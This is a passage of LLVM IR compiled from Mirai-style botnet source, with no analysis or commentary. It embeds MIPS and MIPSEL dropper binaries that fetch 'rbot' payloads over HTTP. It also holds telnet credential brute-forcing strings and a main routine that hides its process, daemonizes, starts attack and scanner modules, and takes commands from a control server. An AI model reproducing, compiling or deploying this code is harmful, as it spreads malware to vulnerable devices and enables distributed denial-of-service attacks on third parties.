!\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ !\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1.5 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2.6 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3.7 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4.8 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"arm64\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = local_unnamed_addr global i16 0, align 2
@auth_table_len = local_unnamed_addr global i32 0, align 4
@auth_table = local_unnamed_addr global %struct.scanner_auth* null, align 8

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i16, align 2
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca [1024 x i8], align 16
  %16 = load i8*, i8** %1, align 8
  %17 = tail call i32 @unlink(i8* %16) #9
  %18 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %4) #9
  %19 = call i32 @sigaddset(%struct.__sigset_t* nonnull %4, i32 2) #9
  %20 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null) #9
  %21 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %22 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %23 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0)) #9
  call void @table_init() #9
  call fastcc void @ensure_single_instance()
  call void @rand_init() #9
  %24 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 32, i32 16, i1 false)
  %25 = icmp eq i32 %0, 2
  br i1 %25, label %26, label %37

; <label>:26:                                     ; preds = %2
  %27 = getelementptr inbounds i8*, i8** %1, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @util_strlen(i8* %28) #9
  %30 = icmp slt i32 %29, 32
  br i1 %30, label %31, label %37

; <label>:31:                                     ; preds = %26
  %32 = load i8*, i8** %27, align 8
  %33 = call i32 @util_strcpy(i8* nonnull %24, i8* %32) #9
  %34 = load i8*, i8** %27, align 8
  %35 = call i32 @util_strlen(i8* %34) #9
  %36 = sext i32 %35 to i64
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 %36, i32 1, i1 false)
  br label %39

; <label>:37:                                     ; preds = %26, %2
  %38 = call i32 @util_strcpy(i8* nonnull %24, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0)) #9
  br label %39

; <label>:39:                                     ; preds = %37, %31
  %40 = load i8*, i8** %1, align 8
  %41 = call i32 @util_strcpy(i8* %40, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0)) #9
  %42 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0)) #9
  %43 = call i32 @fork() #9
  store i32 %43, i32* @pid1, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %46, label %45

; <label>:45:                                     ; preds = %39
  call void @exit(i32 1) #10
  unreachable

; <label>:46:                                     ; preds = %39
  %47 = call i32 @fork() #9
  store i32 %47, i32* @pid2, align 4
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %46
  call void @exit(i32 1) #10
  unreachable

; <label>:50:                                     ; preds = %46
  %51 = call i32 @setsid() #9
  %52 = call i32 @close(i32 0) #9
  %53 = call i32 @close(i32 1) #9
  %54 = call i32 @close(i32 2) #9
  %55 = call signext i8 @attack_init() #9
  call void @scanner_init() #9
  %56 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %57 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  %60 = bitcast i16* %14 to i8*
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i64 0, i64 0
  %62 = bitcast i32* %11 to i8*
  %63 = bitcast i16* %8 to i8*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %50
  %.020 = phi i32 [ 0, %50 ], [ %.020.be, %.backedge.backedge ]
  %64 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %56) #9, !srcloc !1
  %65 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %57) #9, !srcloc !2
  %66 = load i32, i32* @fd_ctrl, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %77, label %68

; <label>:68:                                     ; preds = %.backedge
  %69 = srem i32 %66, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = sdiv i32 %66, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %71
  store i64 %76, i64* %74, align 8
  br label %77

; <label>:77:                                     ; preds = %.backedge, %68
  %78 = load i32, i32* @fd_serv, align 4
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %77
  call fastcc void @establish_connection()
  br label %81

; <label>:81:                                     ; preds = %80, %77
  %82 = load i8, i8* @pending_connection, align 1
  %83 = icmp ne i8 %82, 0
  %84 = load i32, i32* @fd_serv, align 4
  %85 = srem i32 %84, 64
  %86 = zext i32 %85 to i64
  %87 = shl i64 1, %86
  %.sink = select i1 %83, %struct.__sigset_t* %6, %struct.__sigset_t* %5
  %88 = sdiv i32 %84, 64
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %.sink, i64 0, i32 0, i64 %89
  %91 = load i64, i64* %90, align 8
  %92 = or i64 %87, %91
  store i64 %92, i64* %90, align 8
  %93 = load i32, i32* @fd_ctrl, align 4
  %94 = load i32, i32* @fd_serv, align 4
  %95 = icmp sgt i32 %93, %94
  %. = select i1 %95, i32 %93, i32 %94
  store i64 0, i64* %58, align 8
  store i64 10, i64* %59, align 8
  %96 = add nsw i32 %., 1
  %97 = call i32 @select(i32 %96, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #9
  switch i32 %97, label %105 [
    i32 -1, label %.backedge.backedge
    i32 0, label %98
  ]

; <label>:98:                                     ; preds = %81
  store i16 0, i16* %8, align 2
  %99 = add nsw i32 %.020, 1
  %100 = srem i32 %.020, 6
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* @fd_serv, align 4
  %104 = call i64 @send(i32 %103, i8* nonnull %63, i64 2, i32 16384) #9
  br label %105

; <label>:105:                                    ; preds = %81, %102, %98
  %.121 = phi i32 [ %99, %102 ], [ %99, %98 ], [ %.020, %81 ]
  %106 = load i32, i32* @fd_ctrl, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %126, label %108

; <label>:108:                                    ; preds = %105
  %109 = sdiv i32 %106, 64
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %110
  %112 = load i64, i64* %111, align 8
  %113 = srem i32 %106, 64
  %114 = zext i32 %113 to i64
  %115 = shl i64 1, %114
  %116 = and i64 %112, %115
  %117 = icmp eq i64 %116, 0
  br i1 %117, label %126, label %118

; <label>:118:                                    ; preds = %108
  store i32 16, i32* %10, align 4
  %119 = load i32, i32* @fd_ctrl, align 4
  %120 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %121 = call i32 @accept(i32 %119, %struct.sockaddr* nonnull %120, i32* nonnull %10) #9
  call void @scanner_kill()
  %122 = load i32, i32* @maintain_thread, align 4
  %123 = call i32 @kill(i32 %122, i32 9) #9
  call void @attack_kill_all() #9
  %124 = sub nsw i32 0, %51
  %125 = call i32 @kill(i32 %124, i32 9) #9
  call void @exit(i32 0) #10
  unreachable

; <label>:126:                                    ; preds = %108, %105
  %127 = load i8, i8* @pending_connection, align 1
  %128 = icmp eq i8 %127, 0
  br i1 %128, label %167, label %129

; <label>:129:                                    ; preds = %126
  store i8 0, i8* @pending_connection, align 1
  %130 = load i32, i32* @fd_serv, align 4
  %131 = sdiv i32 %130, 64
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %132
  %134 = load i64, i64* %133, align 8
  %135 = srem i32 %130, 64
  %136 = zext i32 %135 to i64
  %137 = shl i64 1, %136
  %138 = and i64 %137, %134
  %139 = icmp eq i64 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %129
  call fastcc void @teardown_connection()
  br label %.backedge.backedge

; <label>:141:                                    ; preds = %129
  store i32 0, i32* %11, align 4
  store i32 4, i32* %12, align 4
  %142 = load i32, i32* @fd_serv, align 4
  %143 = call i32 @getsockopt(i32 %142, i32 1, i32 4, i8* nonnull %62, i32* nonnull %12) #9
  %144 = load i32, i32* %11, align 4
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %153, label %146

; <label>:146:                                    ; preds = %141
  %147 = load i32, i32* @fd_serv, align 4
  %148 = call i32 @close(i32 %147) #9
  store i32 -1, i32* @fd_serv, align 4
  %149 = call i32 @rand_next() #9
  %150 = urem i32 %149, 10
  %151 = add nuw nsw i32 %150, 1
  %152 = call i32 @sleep(i32 %151) #9
  br label %.backedge.backedge

; <label>:153:                                    ; preds = %141
  %154 = call i32 @util_strlen(i8* nonnull %24) #9
  %155 = trunc i32 %154 to i8
  store i8 %155, i8* %13, align 1
  %156 = call i32 @util_local_addr() #9
  store i32 %156, i32* @LOCAL_ADDR, align 4
  %157 = load i32, i32* @fd_serv, align 4
  %158 = call i64 @send(i32 %157, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i64 4, i32 16384) #9
  %159 = load i32, i32* @fd_serv, align 4
  %160 = call i64 @send(i32 %159, i8* nonnull %13, i64 1, i32 16384) #9
  %161 = load i8, i8* %13, align 1
  %162 = icmp eq i8 %161, 0
  br i1 %162, label %.backedge.backedge, label %163

; <label>:163:                                    ; preds = %153
  %164 = load i32, i32* @fd_serv, align 4
  %165 = zext i8 %161 to i64
  %166 = call i64 @send(i32 %164, i8* nonnull %24, i64 %165, i32 16384) #9
  br label %.backedge.backedge

; <label>:167:                                    ; preds = %126
  %168 = load i32, i32* @fd_serv, align 4
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %.backedge.backedge, label %170

; <label>:170:                                    ; preds = %167
  %171 = sdiv i32 %168, 64
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %172
  %174 = load i64, i64* %173, align 8
  %175 = srem i32 %168, 64
  %176 = zext i32 %175 to i64
  %177 = shl i64 1, %176
  %178 = and i64 %174, %177
  %179 = icmp eq i64 %178, 0
  br i1 %179, label %.backedge.backedge, label %180

; <label>:180:                                    ; preds = %170
  %181 = tail call i32* @__errno_location() #11
  store i32 0, i32* %181, align 4
  %182 = load i32, i32* @fd_serv, align 4
  %183 = call i64 @recv(i32 %182, i8* nonnull %60, i64 2, i32 16386) #9
  %184 = trunc i64 %183 to i32
  switch i32 %184, label %187 [
    i32 -1, label %185
    i32 0, label %.thread
  ]

; <label>:185:                                    ; preds = %180
  %186 = load i32, i32* %181, align 4
  switch i32 %186, label %.thread [
    i32 11, label %.backedge.backedge
    i32 4, label %.backedge.backedge
  ]

.thread:                                          ; preds = %180, %185
  call fastcc void @teardown_connection()
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %.thread, %190, %.thread23, %217, %140, %163, %146, %167, %170, %207, %153, %81, %185, %185, %205, %205
  %.020.be = phi i32 [ %.020, %81 ], [ %.121, %146 ], [ %.121, %163 ], [ %.121, %153 ], [ %.121, %140 ], [ %.121, %185 ], [ %.121, %.thread ], [ %.121, %190 ], [ %.121, %205 ], [ %.121, %.thread23 ], [ %.121, %217 ], [ %.121, %207 ], [ %.121, %170 ], [ %.121, %167 ], [ %.121, %185 ], [ %.121, %205 ]
  br label %.backedge

; <label>:187:                                    ; preds = %180
  %188 = load i16, i16* %14, align 2
  %189 = icmp eq i16 %188, 0
  br i1 %189, label %190, label %193

; <label>:190:                                    ; preds = %187
  %191 = load i32, i32* @fd_serv, align 4
  %192 = call i64 @recv(i32 %191, i8* nonnull %60, i64 2, i32 16384) #9
  br label %.backedge.backedge

; <label>:193:                                    ; preds = %187
  %194 = call zeroext i16 @ntohs(i16 zeroext %188) #11
  store i16 %194, i16* %14, align 2
  %195 = icmp ugt i16 %194, 1024
  br i1 %195, label %196, label %199

; <label>:196:                                    ; preds = %193
  %197 = load i32, i32* @fd_serv, align 4
  %198 = call i32 @close(i32 %197) #9
  store i32 -1, i32* @fd_serv, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %193
  store i32 0, i32* %181, align 4
  %200 = load i32, i32* @fd_serv, align 4
  %201 = load i16, i16* %14, align 2
  %202 = zext i16 %201 to i64
  %203 = call i64 @recv(i32 %200, i8* nonnull %61, i64 %202, i32 16386) #9
  %204 = trunc i64 %203 to i32
  switch i32 %204, label %207 [
    i32 -1, label %205
    i32 0, label %.thread23
  ]

; <label>:205:                                    ; preds = %199
  %206 = load i32, i32* %181, align 4
  switch i32 %206, label %.thread23 [
    i32 11, label %.backedge.backedge
    i32 4, label %.backedge.backedge
  ]

.thread23:                                        ; preds = %199, %205
  call fastcc void @teardown_connection()
  br label %.backedge.backedge

; <label>:207:                                    ; preds = %199
  %208 = load i32, i32* @fd_serv, align 4
  %209 = call i64 @recv(i32 %208, i8* nonnull %60, i64 2, i32 16384) #9
  %210 = load i16, i16* %14, align 2
  %211 = call zeroext i16 @ntohs(i16 zeroext %210) #11
  store i16 %211, i16* %14, align 2
  %212 = load i32, i32* @fd_serv, align 4
  %213 = zext i16 %211 to i64
  %214 = call i64 @recv(i32 %212, i8* nonnull %61, i64 %213, i32 16384) #9
  %215 = load i16, i16* %14, align 2
  %216 = icmp eq i16 %215, 0
  br i1 %216, label %.backedge.backedge, label %217

; <label>:217:                                    ; preds = %207
  %218 = zext i16 %215 to i32
  call void @attack_parse(i8* nonnull %61, i32 %218) #9
  br label %.backedge.backedge
}

; Function Attrs: nounwind
declare i32 @unlink(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #1

declare void @table_init() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @ensure_single_instance() unnamed_addr #3 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  store i32 1, i32* %2, align 4
  %3 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %3, i32* @fd_ctrl, align 4
  %4 = icmp eq i32 %3, -1
  br i1 %4, label %42, label %5

; <label>:5:                                      ; preds = %0
  %6 = bitcast i32* %2 to i8*
  %7 = call i32 @setsockopt(i32 %3, i32 1, i32 2, i8* nonnull %6, i32 4) #9
  %8 = load i32, i32* @fd_ctrl, align 4
  %9 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 3, i32 0) #9
  %10 = or i32 %9, 2048
  %11 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 4, i32 %10) #9
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %.b2 = load i1, i1* @ensure_single_instance.local_bind, align 1
  br i1 %.b2, label %15, label %13

; <label>:13:                                     ; preds = %5
